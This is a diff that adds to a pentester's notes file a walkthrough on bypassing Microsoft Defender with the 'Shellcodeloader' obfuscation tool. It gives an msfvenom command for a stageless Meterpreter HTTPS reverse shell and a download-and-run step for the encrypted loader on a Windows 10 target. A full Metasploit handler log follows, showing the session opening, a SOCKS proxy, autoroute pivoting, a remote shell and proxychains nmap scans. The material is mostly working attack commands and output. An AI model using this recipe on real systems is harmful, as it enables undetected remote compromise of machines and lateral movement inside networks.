@@ -1,5 +1,5 @@
 =========================================================================================================================================================
-AV bypass using the obfuscation script 'Harriet'
+AV bypass using the obfuscation script 'Shellcodeloader'
 =========================================================================================================================================================
 
 Source: => https://github.com/knownsec/shellcodeloader
@@ -15,12 +15,14 @@ PoC - Example with a stageless Meterpreter (x64) https reverse shell running on 
 =========================================================================================================================================================
 
 Step 1 - Generate a stageless Meterpreter (x64) https reverse shell using Msfvenom
-==================================================================================
+------------------------------------------------------------------------------------
+
+msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem 
+LHOST=192.168.1.30 LPORT=443 -a x64 -f raw -o meterpreter-x64-reverse-https-raw.bin
 
 
-
-Step 2 - Generate a "shellcodeloader"
-==================================================================================
+Step 2 - Generate a "shellcodeloader" embedding our shellcode that is encrypted
+------------------------------------------------------------------------------------
 
 Settings
 --------
@@ -36,7 +38,170 @@ Only the shelcode loader generated with the following loading methods are not de
 
 
 Step 3 - Download and execute the shellcode loader on a target Windows 10 laptop (with the MS Defender Antivirus enabled & up-to-date)
-=======================================================================================================================================
+---------------------------------------------------------------------------------------------------------------------------------------
+
+C:\Users\Administrator\Downloads> wget -URI http://X.X.X.X/FiberLoad-loader.exe -OutFile FiberLoad-loader.exe 
+C:\Users\Administrator\Downloads> FiberLoad-loader.exe 
 
 
+Step 4 - You have now a meterpreter shell running without being detected nor blocked by the MS Defender AV
+-----------------------------------------------------------------------------------------------------------
 
+jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem; run -j"
+[sudo] password for jeff: 
+[!] The following modules were loaded with warnings:
+[!]     /usr/share/metasploit-framework/modules/encoders/x86/bf_xor.rb
+[!] Please see /root/.msf4/logs/framework.log for details.
+                                                  
+
+                                   .,,.                  .
+                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
+                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
+                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
+  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
+  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
+ d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
+d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
+                          .a#$$$$$$"`          88b  d8P  88b`?8888P'
+                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
+                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
+                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
+              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
+           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
+_______________________________________________________________   ,&$$$$$$'_____
+                                                                 ll&&$$$$'
+                                                              .;;lll&&&&'
+                                                            ...;;lllll&'
+                                                          ......;;;llll;;;....
+                                                           ` ......;;;;... .  .
+
+
+       =[ metasploit v6.1.14-dev                          ]
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
++ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Save the current environment with the 
+save command, future console restarts will use this 
+environment again
+                                                                                                                                                                                                                                           
+[*] Starting persistent handler(s)...                                                                                                                                                                                                      
+[*] Using configured payload generic/shell_reverse_tcp                                                                                                                                                                                     
+PAYLOAD => windows/meterpreter_reverse_https                                                                                                                                                                                               
+LHOST => 192.168.1.30                                                                                                                                                                                                                      
+LPORT => 443                                                                                                                                                                                                                               
+EXITFUNC => thread                                                                                                                                                                                                                         
+ExitOnSession => false
+SessionCommunicationTimeout => 0
+EnableUnicodeEncoding => true
+HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started HTTPS reverse handler on https://192.168.1.30:443
+msf6 exploit(multi/handler) > [!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: u5mkwsup) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: u5mkwsup) Redirecting stageless connection from /D28KeLz_rGz3sfazlBDT2wMg58v65s8AkzXwTqPsQ1vYMNDB-uT7HY4_Eu2wv with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
+[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: u5mkwsup) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: u5mkwsup) Attaching orphaned/stageless session...
+[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: u5mkwsup) Without a database connected that payload UUID tracking will not work!
+[*] Meterpreter session 1 opened (192.168.1.30:443 -> 127.0.0.1 ) at 2022-12-20 03:56:45 +0100
+
+msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > options
+
+Module options (auxiliary/server/socks_proxy):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        Proxy password for SOCKS5 listener
+   SRVHOST   0.0.0.0          yes       The address to listen on
+   SRVPORT   1080             yes       The port to listen on
+   USERNAME                   no        Proxy username for SOCKS5 listener
+   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)
+
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Proxy  Run a SOCKS proxy server
+
+
+msf6 auxiliary(server/socks_proxy) > run
+[*] Auxiliary module running as background job 1.
+
+[*] Starting the SOCKS proxy server
+msf6 auxiliary(server/socks_proxy) > sessions -i
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                        Connection
+  --  ----  ----                     -----------                        ----------
+  1         meterpreter x64/windows  Laptop1\Administrator @ PO718687  192.168.1.30:443 -> 127.0.0.1  (192.168.1.113)
+
+msf6 auxiliary(server/socks_proxy) > seesions -i 1
+[-] Unknown command: seesions
+msf6 auxiliary(server/socks_proxy) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > run autorute -s 192.168.1.0/24
+
+[-] The specified meterpreter session script could not be found: autorute
+meterpreter > run autoroute -s 192.168.1.0/24
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 192.168.1.0/255.255.255.0...
+[+] Added route to 192.168.1.0/255.255.255.0 via 192.168.1.113
+[*] Use the -p option to list all active routes
+meterpreter > getuid
+Server username: Laptop1\Administrator
+meterpreter > shell
+Process 9264 created.
+Channel 12 created.
+Microsoft Windows [Version 10.0.19044.2364]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator\Downloads>hostname
+hostname
+Laptop1
+
+C:\Users\Administrator\Downloads>exit
+exit
+meterpreter > 
+
+<SNIP>
+
+
+Example - NMAP scan using proxychains and the Meterpreter shell 
+----------------------------------------------------------------
+jeff@kali:~$ proxychains nmap -sT 192.168.1.113 -p 445,3389
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-12-20 04:06 CET
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.113:80-<--timeout
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.113:445-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.113:3389-<><>-OK
+RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+Nmap scan report for 192.168.1.113
+Host is up (2.7s latency).
+
+PORT     STATE SERVICE
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 4.36 seconds
+
+Example - NMAP scan without using proxychains and the Meterpreter shell (the port 3389 is filtered)
+----------------------------------------------------------------------------------------------------
+jeff@kali:~$ nmap -sT -Pn 192.168.1.113 -p 445,3389
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-12-20 04:05 CET
+Nmap scan report for 192.168.1.113
+Host is up (0.0010s latency).
+
+PORT     STATE    SERVICE
+445/tcp  open     microsoft-ds
+3389/tcp filtered ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 1.38 seconds
